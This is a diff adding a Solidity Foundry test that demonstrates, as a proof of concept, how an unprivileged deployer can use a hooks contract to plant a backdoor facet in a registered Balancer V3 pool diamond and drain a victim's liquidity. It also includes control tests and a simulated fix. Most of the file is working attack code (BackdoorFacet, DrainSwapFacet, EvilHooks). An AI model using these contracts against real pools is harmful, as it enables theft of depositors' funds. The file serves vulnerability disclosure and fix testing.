@@ -1,0 +1,289 @@
+// SPDX-License-Identifier: BSL-1.1
+pragma solidity ^0.8.0;
+
+import {IERC20} from "@crane/contracts/interfaces/IERC20.sol";
+import {IDiamond} from "@crane/contracts/interfaces/IDiamond.sol";
+import {IDiamondLoupe} from "@crane/contracts/interfaces/IDiamondLoupe.sol";
+import {IPostDeployAccountHook} from "@crane/contracts/interfaces/IPostDeployAccountHook.sol";
+import {ERC2535Repo} from "@crane/contracts/introspection/ERC2535/ERC2535Repo.sol";
+import {IRateProvider} from "@crane/contracts/interfaces/protocols/dexes/balancer/v3/IRateProvider.sol";
+import {
+    TokenConfig,
+    TokenType,
+    LiquidityManagement,
+    HookFlags,
+    PoolSwapParams
+} from "@crane/contracts/interfaces/protocols/dexes/balancer/v3/VaultTypes.sol";
+import {IDiamondPackageCallBackFactory} from "@crane/contracts/interfaces/IDiamondPackageCallBackFactory.sol";
+import {IPermit2} from "@crane/contracts/interfaces/protocols/utils/permit2/IPermit2.sol";
+
+import {IVaultRegistryDeployment} from "contracts/interfaces/IVaultRegistryDeployment.sol";
+import {IVaultRegistryVaultQuery} from "contracts/interfaces/IVaultRegistryVaultQuery.sol";
+import {IVaultFeeOracleQuery} from "contracts/interfaces/IVaultFeeOracleQuery.sol";
+import {IBalancerV3ConstantProductPoolStandardVaultPkg} from
+    "contracts/protocols/dexes/balancer/v3/pools/constProd/IBalancerV3ConstantProductPoolStandardVaultPkg.sol";
+import {BalancerV3ConstantProductPool_FactoryService} from
+    "contracts/protocols/dexes/balancer/v3/pools/constProd/BalancerV3ConstantProductPool_FactoryService.sol";
+import {TestBase_StandardExchangeBufferPool} from
+    "test/foundry/spec/protocols/dexes/balancer/v3/pools/constProd/standardExchange/bases/TestBase_StandardExchangeBufferPool.sol";
+
+/// Facet the attacker plants: arbitrary delegatecall, attacker only.
+contract BackdoorFacet {
+    address public immutable ATTACKER;
+    constructor(address a) { ATTACKER = a; }
+    function exec(address target, bytes calldata data) external {
+        require(msg.sender == ATTACKER, "no");
+        (bool ok, bytes memory r) = target.delegatecall(data);
+        if (!ok) assembly { revert(add(r, 32), mload(r)) }
+    }
+}
+
+/// Malicious onSwap: pays out 99% of tokenOut balance for any input.
+contract DrainSwapFacet {
+    function onSwap(PoolSwapParams calldata p) external pure returns (uint256) {
+        return p.balancesScaled18[p.indexOut] * 99 / 100;
+    }
+}
+
+/// Code the backdoor delegatecalls later (runs in pool storage).
+contract RouteSwapImpl {
+    function route(address drainFacet) external {
+        IDiamond.FacetCut[] memory c = new IDiamond.FacetCut[](1);
+        bytes4[] memory s = new bytes4[](1);
+        s[0] = DrainSwapFacet.onSwap.selector;
+        c[0] = IDiamond.FacetCut(drainFacet, IDiamond.FacetCutAction.Replace, s);
+        ERC2535Repo._processFacetCuts(c);
+    }
+}
+
+/// "Hooks contract" chosen by the attacker. Reports no hook flags (looks inert).
+contract EvilHooks {
+    address public immutable BACKDOOR;
+    constructor(address backdoor) { BACKDOOR = backdoor; }
+
+    function onRegister(address, address pool, TokenConfig[] memory, LiquidityManagement calldata)
+        external
+        returns (bool)
+    {
+        // The pool diamond still has Crane's PostDeployAccountHookFacet mounted; it delegatecalls msg.sender.
+        IPostDeployAccountHook(pool).postDeploy();
+        return true;
+    }
+
+    function getHookFlags() external pure returns (HookFlags memory f) { return f; }
+
+    /// Runs via delegatecall in the pool diamond's storage context.
+    function postDeploy(address) external returns (bool) {
+        IDiamond.FacetCut[] memory c = new IDiamond.FacetCut[](1);
+        bytes4[] memory s = new bytes4[](1);
+        s[0] = BackdoorFacet.exec.selector;
+        c[0] = IDiamond.FacetCut(BACKDOOR, IDiamond.FacetCutAction.Add, s);
+        ERC2535Repo._processFacetCuts(c);
+        return true;
+    }
+}
+
+
+/// Patched hook facet (fix simulation): only the factory may trigger the delegatecall.
+contract PatchedPostDeployAccountHookFacet {
+    address public immutable FACTORY;
+    constructor(address f) { FACTORY = f; }
+    function postDeploy() public returns (bool) {
+        require(msg.sender == FACTORY, "PostDeployHook: not factory");
+        (bool ok, bytes memory r) = msg.sender.delegatecall(abi.encodeWithSignature("postDeploy(address)", address(this)));
+        if (!ok) assembly { revert(add(r, 32), mload(r)) }
+        return true;
+    }
+    function facetFuncs() public pure returns (bytes4[] memory f) { f = new bytes4[](1); f[0] = IPostDeployAccountHook.postDeploy.selector; }
+    function facetInterfaces() public pure returns (bytes4[] memory i) { i = new bytes4[](1); i[0] = type(IPostDeployAccountHook).interfaceId; }
+    function facetName() public pure returns (string memory) { return "PostDeployAccountHookFacet"; }
+}
+
+/// Alternative entry: attacker token whose decimals() mutates state. Balancer calls decimals() via STATICCALL.
+contract EvilDecimalsToken {
+    uint256 public touched;
+    mapping(address => uint256) public balanceOf;
+    function decimals() external returns (uint8) { touched += 1; return 18; }
+    function totalSupply() external pure returns (uint256) { return 0; }
+}
+
+contract R3PostDeployHookTest is TestBase_StandardExchangeBufferPool {
+    using BalancerV3ConstantProductPool_FactoryService for IVaultRegistryDeployment;
+
+    IBalancerV3ConstantProductPoolStandardVaultPkg cpPkg;
+
+    function _registerCpPkg() internal {
+        IBalancerV3ConstantProductPoolStandardVaultPkg.PkgInit memory p_;
+        p_.basicVaultFacet = multiAssetBasicVaultFacet;
+        p_.standardVaultFacet = multiAssetStandardVaultFacet;
+        p_.balancerV3VaultAwareFacet = balancerV3VaultAwareFacet;
+        p_.betterBalancerV3PoolTokenFacet = betterBalancerV3PoolTokenFacet;
+        p_.defaultPoolInfoFacet = defaultPoolInfoFacet;
+        p_.standardSwapFeePercentageBoundsFacet = standardSwapFeePercentageBoundsFacet;
+        p_.unbalancedLiquidityInvariantRatioBoundsFacet = unbalancedLiquidityInvariantRatioBoundsFacet;
+        p_.balancerV3AuthenticationFacet = balancerV3AuthenticationFacet;
+        p_.balancerV3ConstProdPoolFacet =
+            BalancerV3ConstantProductPool_FactoryService.deployBalancerV3ConstantProductPoolFacet(create3Factory);
+        p_.vaultRegistry = IVaultRegistryDeployment(address(indexedexManager));
+        p_.vaultFeeOracle = IVaultFeeOracleQuery(address(indexedexManager));
+        p_.balancerV3Vault = bv3Vault;
+        p_.diamondFactory = diamondPackageFactory;
+        vm.startPrank(owner);
+        cpPkg = IVaultRegistryDeployment(address(indexedexManager)).deployBalancerV3ConstantProductPoolStandardVaultPkg(p_);
+        vm.stopPrank();
+    }
+
+    function _approveAll(address who) internal {
+        vm.startPrank(who);
+        dai.approve(address(router), type(uint256).max);
+        usdc.approve(address(router), type(uint256).max);
+        dai.approve(address(permit2), type(uint256).max);
+        usdc.approve(address(permit2), type(uint256).max);
+        IPermit2(address(permit2)).approve(address(dai), address(router), type(uint160).max, type(uint48).max);
+        IPermit2(address(permit2)).approve(address(usdc), address(router), type(uint160).max, type(uint48).max);
+        vm.stopPrank();
+    }
+
+    address attacker;
+    address victim;
+    address evilPool;
+    BackdoorFacet backdoor;
+    DrainSwapFacet drain;
+    RouteSwapImpl routeImpl;
+
+    function _attackerDeploys() internal {
+        vm.startPrank(attacker);
+        backdoor = new BackdoorFacet(attacker);
+        EvilHooks hooks = new EvilHooks(address(backdoor));
+        drain = new DrainSwapFacet();
+        routeImpl = new RouteSwapImpl();
+        TokenConfig[] memory t_ = new TokenConfig[](2);
+        (address a, address b) = address(dai) < address(usdc) ? (address(dai), address(usdc)) : (address(usdc), address(dai));
+        t_[0] = TokenConfig(IERC20(a), TokenType.STANDARD, IRateProvider(address(0)), false);
+        t_[1] = TokenConfig(IERC20(b), TokenType.STANDARD, IRateProvider(address(0)), false);
+        evilPool = cpPkg.deployVault(t_, address(hooks)); // permissionless helper -> registry.deployVault
+        vm.stopPrank();
+    }
+
+    function _victimSeeds() internal {
+        dai.mint(victim, 1_000 ether);
+        usdc.mint(victim, 1_000 ether);
+        _approveAll(victim);
+        IERC20[] memory toks = bv3Vault.getPoolTokens(evilPool);
+        uint256[] memory amts = new uint256[](2);
+        amts[0] = 1_000 ether;
+        amts[1] = 1_000 ether;
+        vm.prank(victim);
+        router.initialize(evilPool, toks, amts, 0, false, "");
+    }
+
+    function _attackerDrains(uint256 dust) internal returns (uint256 out) {
+        dai.mint(attacker, dust);
+        _approveAll(attacker);
+        vm.startPrank(attacker);
+        BackdoorFacet(evilPool).exec(address(routeImpl), abi.encodeCall(RouteSwapImpl.route, (address(drain))));
+        out = router.swapSingleTokenExactIn(evilPool, IERC20(address(dai)), IERC20(address(usdc)), dust, 0, block.timestamp, false, "");
+        vm.stopPrank();
+    }
+
+    function test_unprivilegedDeployerBackdoorsRegisteredPoolAndDrainsLP() public {
+        // setup (privileged, before attack): owner registers the canonical ConstProd package
+        _registerCpPkg();
+        attacker = makeAddr("attacker");
+        victim = makeAddr("victimLP");
+
+        _attackerDeploys();
+
+        // Pool is a registry-registered vault of a registered package.
+        assertTrue(IVaultRegistryVaultQuery(address(indexedexManager)).isVault(evilPool), "registered");
+        // Post-deploy hook facet was removed as designed ...
+        assertEq(IDiamondLoupe(evilPool).facetAddress(IPostDeployAccountHook.postDeploy.selector), address(0));
+        // ... but the attacker's selector was cut in during the window.
+        assertEq(IDiamondLoupe(evilPool).facetAddress(BackdoorFacet.exec.selector), address(backdoor), "backdoor mounted");
+
+        _victimSeeds();
+        uint256 victimBpt = IERC20(evilPool).balanceOf(victim);
+        emit log_named_uint("victim BPT", victimBpt);
+
+        uint256 usdc0 = usdc.balanceOf(attacker);
+        uint256 dust = 1e12;
+        uint256 out = _attackerDrains(dust);
+        uint256 gained = usdc.balanceOf(attacker) - usdc0;
+        emit log_named_uint("attacker DAI spent", dust);
+        emit log_named_uint("attacker USDC gained", gained);
+        assertEq(dai.balanceOf(attacker), 0, "spent all dust");
+        assertEq(out, gained);
+        assertGt(gained, 980 ether, "drained ~99% of victim USDC");
+        // victim loss: withdraw all BPT proportionally and value at fair 1:1 price
+        vm.startPrank(victim);
+        IERC20(evilPool).approve(address(router), type(uint256).max);
+        uint256[] memory mins = new uint256[](2);
+        router.removeLiquidityProportional(evilPool, victimBpt, mins, false, "");
+        vm.stopPrank();
+        uint256 victimBack = dai.balanceOf(victim) + usdc.balanceOf(victim);
+        emit log_named_uint("victim value back (fair 1:1, 18dp)", victimBack);
+        emit log_named_uint("victim loss", 2_000 ether - victimBack);
+        emit log_named_uint("attacker net profit (fair 1:1)", gained - dust);
+        assertLt(victimBack, 1_020 ether, "victim lost ~half of deposit");
+    }
+
+    // Control: honest deployment (no hooks) yields a pool with no foreign selector.
+    function test_control_honestPoolHasNoBackdoor() public {
+        _registerCpPkg();
+        address u = makeAddr("honestDeployer");
+        TokenConfig[] memory t_ = new TokenConfig[](2);
+        (address a, address b) = address(dai) < address(usdc) ? (address(dai), address(usdc)) : (address(usdc), address(dai));
+        t_[0] = TokenConfig(IERC20(a), TokenType.STANDARD, IRateProvider(address(0)), false);
+        t_[1] = TokenConfig(IERC20(b), TokenType.STANDARD, IRateProvider(address(0)), false);
+        vm.prank(u);
+        address p = cpPkg.deployVault(t_, address(0));
+        assertTrue(IVaultRegistryVaultQuery(address(indexedexManager)).isVault(p));
+        assertEq(IDiamondLoupe(p).facetAddress(BackdoorFacet.exec.selector), address(0));
+        assertEq(IDiamondLoupe(p).facetAddress(IPostDeployAccountHook.postDeploy.selector), address(0));
+    }
+
+    // Variant: token decimals() path cannot mutate state (STATICCALL) -> registration reverts. Only the hooks path works.
+    function test_variant_tokenDecimalsPathBlockedByStaticcall() public {
+        _registerCpPkg();
+        attacker = makeAddr("attacker");
+        EvilDecimalsToken evil = new EvilDecimalsToken();
+        TokenConfig[] memory t_ = new TokenConfig[](2);
+        (address a, address b) = address(dai) < address(evil) ? (address(dai), address(evil)) : (address(evil), address(dai));
+        t_[0] = TokenConfig(IERC20(a), TokenType.STANDARD, IRateProvider(address(0)), false);
+        t_[1] = TokenConfig(IERC20(b), TokenType.STANDARD, IRateProvider(address(0)), false);
+        vm.prank(attacker);
+        try cpPkg.deployVault(t_, address(0)) { fail(); } catch (bytes memory r) {
+            emit log_named_bytes("token-path revert data", r);
+        }
+        assertEq(evil.touched(), 0);
+    }
+
+    // Fix control: with a factory-only hook facet, the identical attack reverts at deployVault.
+    function test_fixControl_factoryOnlyHookBlocksAttack() public {
+        _registerCpPkg();
+        address facet = address(IDiamondPackageCallBackFactory(address(diamondPackageFactory)).POST_DEPLOY_HOOK_FACET());
+        PatchedPostDeployAccountHookFacet patched = new PatchedPostDeployAccountHookFacet(address(diamondPackageFactory));
+        vm.etch(facet, address(patched).code); // setup-time code patch simulating the fix
+        attacker = makeAddr("attacker");
+        victim = makeAddr("victimLP");
+        try this.extAttackerDeploys() { fail(); } catch (bytes memory r) {
+            emit log_named_bytes("fix revert data", r);
+            assertEq(keccak256(r), keccak256(abi.encodeWithSignature("Error(string)", "PostDeployHook: not factory")), "blocked by fix");
+        }
+        // honest deployments still work with the fix
+        test_control_honestPoolHasNoBackdoor_noRegister();
+    }
+
+    function extAttackerDeploys() external { _attackerDeploys(); }
+
+    function test_control_honestPoolHasNoBackdoor_noRegister() internal {
+        TokenConfig[] memory t_ = new TokenConfig[](2);
+        (address a, address b) = address(dai) < address(usdc) ? (address(dai), address(usdc)) : (address(usdc), address(dai));
+        t_[0] = TokenConfig(IERC20(a), TokenType.STANDARD, IRateProvider(address(0)), false);
+        t_[1] = TokenConfig(IERC20(b), TokenType.STANDARD, IRateProvider(address(0)), false);
+        vm.prank(makeAddr("honestDeployer"));
+        address p = cpPkg.deployVault(t_, address(0));
+        assertTrue(IVaultRegistryVaultQuery(address(indexedexManager)).isVault(p));
+        assertEq(IDiamondLoupe(p).facetAddress(IPostDeployAccountHook.postDeploy.selector), address(0));
+    }
+}
